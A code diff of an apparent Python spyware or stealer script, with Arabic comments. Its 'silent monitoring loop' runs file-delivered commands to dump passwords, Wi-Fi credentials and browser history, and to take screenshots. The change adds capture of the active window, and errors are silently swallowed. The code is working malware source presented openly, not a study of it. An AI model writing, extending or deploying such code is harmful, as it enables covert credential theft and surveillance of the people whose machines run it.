@@ -127,21 +127,54 @@ def update():
 
 
 # حلقة المراقبة الصامتة
-if not os.path.exists(BASE_DIR): os.makedirs(BASE_DIR)
+from PIL import ImageGrab
+import pygetwindow as gw
+import os, time
+
+if not os.path.exists(BASE_DIR):
+    os.makedirs(BASE_DIR)
+
 while True:
     if os.path.exists(CMD_FILE):
         try:
-            with open(CMD_FILE, "r") as f: cmd = f.read().strip()
+            with open(CMD_FILE, "r") as f:
+                cmd = f.read().strip()
+
             res = ""
-            if cmd == "passwords": res = run_passwords()
-            elif cmd == "wifi": res = run_wifi()
-            elif cmd in ["history", "browser"]: res = run_history()
-            elif cmd == "update": res = update()
+
+            if cmd == "passwords":
+                res = run_passwords()
+
+            elif cmd == "wifi":
+                res = run_wifi()
+
+            elif cmd in ["history", "browser"]:
+                res = run_history()
+
+            elif cmd == "update":
+                res = update()
+
+            # 📸 Screenshot كامل الشاشة (كما هو بدون تغيير)
             elif cmd == "screenshot":
                 ImageGrab.grab().save(SS_FILE)
                 res = "SCREENSHOT_DONE"
-            
-            with open(RES_FILE, "w", encoding="utf-8") as f: f.write(res)
-            os.remove(CMD_FILE) # مسح الطلب بعد التنفيذ
-        except: pass
+
+            # 🎯 Screenshot للنافذة النشطة فقط (الجديد)
+            elif cmd == "screenshot_active":
+                window = gw.getActiveWindow()
+                if window:
+                    bbox = (window.left, window.top, window.right, window.bottom)
+                    ImageGrab.grab(bbox=bbox).save(SS_FILE)
+                    res = "SCREENSHOT_ACTIVE_DONE"
+                else:
+                    res = "NO_ACTIVE_WINDOW"
+
+            with open(RES_FILE, "w", encoding="utf-8") as f:
+                f.write(res)
+
+            os.remove(CMD_FILE)  # مسح الطلب بعد التنفيذ
+
+        except:
+            pass
+
     time.sleep(1)
